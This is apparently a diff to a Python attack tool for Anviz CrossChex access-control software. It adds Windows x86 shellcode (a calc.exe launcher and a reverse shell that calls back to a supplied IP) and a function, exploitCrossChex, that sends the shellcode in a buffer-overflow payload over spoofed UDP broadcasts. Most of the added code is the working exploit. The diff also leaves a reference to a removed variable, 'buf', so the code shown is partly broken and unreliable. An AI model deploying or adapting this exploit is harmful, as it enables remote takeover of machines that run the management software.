@@ -5,6 +5,7 @@ import binascii
 import ipaddress
 import codecs
 import time
+import sys
 
 # Scapy
 from scapy.all import Raw,IP,Dot1Q,UDP,Ether
@@ -118,6 +119,54 @@ ACK_TIME_OUT = b"\x08"  # capture timeout
 ACK_USER_OCCUPIED = b"\x0A"  # user already exists
 ACK_FINGER_OCCUPIED = b"\x0B"  # fingerprint already exists
 
+# SHELLCODE options
+
+# shellcode working calc.exe
+calculator_payload = b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
+calculator_payload += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
+calculator_payload += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
+calculator_payload += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
+calculator_payload += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
+calculator_payload += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
+calculator_payload += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
+calculator_payload += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
+calculator_payload += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
+calculator_payload += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
+calculator_payload += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
+calculator_payload += b"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
+calculator_payload += b"\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
+calculator_payload += b"\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
+calculator_payload += b"\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
+
+# shellcode windows x86 reverse_shell
+shell_payload_1 = b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
+shell_payload_1 += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
+shell_payload_1 += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
+shell_payload_1 += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
+shell_payload_1 += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
+shell_payload_1 += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
+shell_payload_1 += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
+shell_payload_1 += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
+shell_payload_1 += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
+shell_payload_1 += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
+shell_payload_1 += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
+shell_payload_1 += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
+shell_payload_1 += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
+shell_payload_1 += b"\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
+shell_payload_1 += b"\xdf\xe0\xff\xd5\x97\x6a\x05\x68"
+
+# shellcode windows x86 reverse_shell (part_2)
+shell_payload_2 = b"\x68\x02\x00\x01\xbd\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
+shell_payload_2 += b"\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
+shell_payload_2 += b"\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
+shell_payload_2 += b"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
+shell_payload_2 += b"\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
+shell_payload_2 += b"\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
+shell_payload_2 += b"\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
+shell_payload_2 += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
+shell_payload_2 += b"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
+shell_payload_2 += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
+
 def makePayload(command, data='', CH=b"\x00\x00\x00\x00"):
     if len(data) < 0x190:
 
@@ -176,8 +225,10 @@ def sendPayload(ip, port, payload):
     # return the packet
     return (preamble, deviceCode, ack, returnValue, size, data, crc)
 
+
 def sendUDPBroadcast(ip="255.255.255.255", sport=5060, dport=5050):
     scapy.all.sendp( Ether(dst="ff:ff:ff:ff:ff:ff")/Dot1Q(vlan=1)/IP(dst=ip)/UDP(sport=sport,dport=dport)/Raw(load=b'\xa5\x00\x00\x00\x00\x02\x00\x00\x47\x23') )
+
 
 def setUDPServer(ip='', port=5060, timeout=5):
     # Datagram (udp) socket
@@ -212,6 +263,7 @@ def setUDPServer(ip='', port=5060, timeout=5):
             print("[*] Found %d devices" % deviceCounter)
     s.close()
     return responses
+
 
 def getConfig(ip, port=5010, CH=b"\x00\x00\x00\x00"):
     payload = makePayload(CMD_GET_INFO, CH=CH)
@@ -252,6 +304,7 @@ def getNetwork(ip, port=5010, CH=b"\x00\x00\x00\x00"):
     response = sendPayload(ip, port, payload)
     return response
 
+
 def getUserRecordsAmount(ip, port=5010, CH=b"\x00\x00\x00\x00"):
     payload = makePayload(CMD_GET_RECORDS, CH=CH)
     (preamble, deviceCode, ack, returnValue, size, data, crc) = sendPayload(ip, port, payload)
@@ -266,6 +319,7 @@ def getUserRecordsAmount(ip, port=5010, CH=b"\x00\x00\x00\x00"):
     user_amount = struct.unpack(">H", user_amount)[0]
     print("\n[%s] Number of users: %d\n" % (ip, int(user_amount)))
     return (user_amount, fp_amount, password_amount, card_amount, all_record_amount, new_record_amount)
+
 
 def getUserRecords(ip, port=5010, CH=b"\x00\x00\x00\x00"):
     payload = makePayload(CMD_GET_RECORDS, CH=CH)
@@ -459,7 +513,6 @@ def getDevices(ip="255.255.255.255", timeout=5):
     responses = setUDPServer(timeout=timeout)
 
     for (response, (ip, port)) in responses:
-
         # Creating the tuple of the data
         preamble = response[0]  # 1 byte
         deviceCode = response[1:5]  # 4 bytes
@@ -502,7 +555,14 @@ def getDevices(ip="255.255.255.255", timeout=5):
 
     return response
 
-def sendFuzzingUDPBroadcast(ip="255.255.255.255", sport=5050, dport=5060):
+def ipToShellcode(ip):
+  a = ip.split('.')
+  b = hex(int(a[0])) + hex(int(a[1])) + hex(int(a[2])) + hex(int(a[3]))
+  b = b.replace("0x","")
+  return binascii.unhexlify(b)
+
+def sendFuzzingUDPBroadcast(ip="255.255.255.255", interface="eth0", sport=5050, dport=5060):
+    shell = False # default is drop calc function
 
     request = b"A"*77 # Original payload substitute
     request += b"B"*184
@@ -510,67 +570,15 @@ def sendFuzzingUDPBroadcast(ip="255.255.255.255", sport=5050, dport=5060):
     request += b"A"*4
     # 269 bytes
 
-    # shellcode working calc.exe
-    # buf = b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
-    # buf += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
-    # buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
-    # buf += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
-    # buf += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
-    # buf += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
-    # buf += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
-    # buf += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
-    # buf += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
-    # buf += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
-    # buf += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
-    # buf += b"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
-    # buf += b"\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
-    # buf += b"\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
-    # buf += b"\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
-
-    # reverse shell windows/shell_reverse_tcp
-    buf = b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
-    buf += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
-    buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
-    buf += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
-    buf += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
-    buf += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
-    buf += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
-    buf += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
-    buf += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
-    buf += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
-    buf += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
-    buf += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
-    buf += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
-    buf += b"\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
-    buf += b"\xdf\xe0\xff\xd5\x97\x6a\x05\x68"
-
-    # buf += "\xc0\xa8\x0b\x01" # xc0\xa8\x0b\x01 IP
-
-    a = ip.split('.')
-    b = '{:02X}{:02X}{:02X}{:02X}'.format(*map(int, a))
-    lhost = binascii.unhexlify(b)
-
-    print(lhost)
-
-    buf += lhost
-
-
-    buf += b"\x68\x02\x00\x01\xbd\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
-    buf += b"\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
-    buf += b"\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
-    buf += b"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
-    buf += b"\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
-    buf += b"\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
-    buf += b"\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
-    buf += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
-    buf += b"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
-    buf += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
+    if (ip != "255.255.255.255"):
+        request = request + shell_payload_1 + ipToShellcode(ip) + shell_payload_2
+    else:
+        request = request + calculator_payload
 
     request += buf
+    scapy.all.sendp( Ether(src='00:00:00:00:00:00', dst="ff:ff:ff:ff:ff:ff")/IP(src=ip,dst='255.255.255.255')/UDP(sport=sport,dport=dport)/Raw(load=request),  iface=interface )
 
-    scapy.all.sendp( Ether(src='00:22:ca:88:a5:d0', dst="ff:ff:ff:ff:ff:ff")/IP(src=ip,dst='255.255.255.255')/UDP(sport=sport,dport=dport)/Raw(load=request),  iface="vmnet4" )
-
-def setFuzzUDPServer(ip='', port=5050, timeout=150):
+def setFuzzUDPServer(ip='', interface='eth0', port=5050, timeout=150):
     # Datagram (udp) socket
     try :
     	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -584,9 +592,10 @@ def setFuzzUDPServer(ip='', port=5050, timeout=150):
     	print('[*] Server socket bind failed')
     	sys.exit()
 
-    print('[*] Waiting for crosscheck')
+    print('[*] Waiting for crosschex')
     s.settimeout(timeout)
     timeout = time.time() + timeout
+    responses = []
 
     while True:
         if time.time() > timeout:
@@ -594,13 +603,14 @@ def setFuzzUDPServer(ip='', port=5050, timeout=150):
         try:
             response = s.recvfrom(1024)
             print(response)
-            sendFuzzingUDPBroadcast(ip=ip)
-            response = s.recvfrom(1024)
+            responses.append(response)
+            sendFuzzingUDPBroadcast(ip=ip, interface=interface)
+            response = s.recvfrom(1024)            
         except socket.timeout:
             print("[!] Error with UDP server")
 
     s.close()
     return responses
 
-def fuzzDevice(ip):
-    setFuzzUDPServer(ip=ip)
+def exploitCrossChex(ip, interface):
+    setFuzzUDPServer(ip=ip, interface=interface)
